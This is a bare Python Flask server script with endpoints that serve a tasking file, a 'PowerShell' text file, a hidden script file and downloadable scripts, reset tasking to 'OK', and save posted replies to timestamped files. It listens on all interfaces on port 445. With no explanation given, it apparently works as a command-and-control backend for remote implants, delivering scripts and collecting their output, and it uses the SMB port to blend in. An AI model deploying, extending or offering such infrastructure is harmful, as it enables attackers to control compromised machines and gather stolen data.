import os
from flask import Flask, request, send_file
from datetime import datetime
app = Flask(__name__)

REPLIES_DIR = "replies"
if not os.path.exists(REPLIES_DIR):
    os.mkdir(REPLIES_DIR)
SCRIPTS_DIR = "scripts"
if not os.path.exists(SCRIPTS_DIR):
    os.mkdir(SCRIPTS_DIR)
SCRIPTS_FILE = os.path.join("resources", "scripts.txt")
HIDE_FILE = os.path.join("resources", "hide.txt")
PS_FILE = os.path.join("resources", "hide.txt")

if not os.path.exists(SCRIPTS_DIR):
    os.makedirs(SCRIPTS_DIR)

@app.route('/scripts.txt', methods=['GET'])
def get_scripts():
    if os.path.exists(SCRIPTS_FILE):
        return send_file(SCRIPTS_FILE, mimetype='text/plain')
    else:
        return "No scripts available", 404
@app.route('/pw.txt', methods=['GET'])
def return_powershell():
    return send_file(PS_FILE, mimetype='text/plain')
@app.route('/hide.txt', methods=['GET'])
def return_hide():
    return send_file(HIDE_FILE, mimetype='text/plain')
@app.route('/update', methods=['POST'])
def update_scripts():
    if request.method == 'POST':
        with open(SCRIPTS_FILE, 'w') as file:
            file.write("OK")
        return "Scripts updated to OK", 200
    else:
        return "Invalid request method", 405
@app.route('/scripts/<script_name>', methods=['GET'])
def get_script(script_name):
    script_path = os.path.join(SCRIPTS_DIR, script_name)
    if os.path.exists(script_path):
        return send_file(script_path, mimetype='application/octet-stream')
    else:
        return "Script not found", 404
@app.route('/reply', methods=['POST'])
def save_reply():
    text = request.data.decode('utf-8')
    if not text.strip():
        return "No text provided", 400
    filename = datetime.now().strftime("%Y-%m-%d_%H-%M-%S.txt")
    filepath = os.path.join(REPLIES_DIR, filename)
    with open(filepath, 'w', encoding='utf-8') as f:
        f.write(text)
    return f"Saved to {filename}", 200


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=445)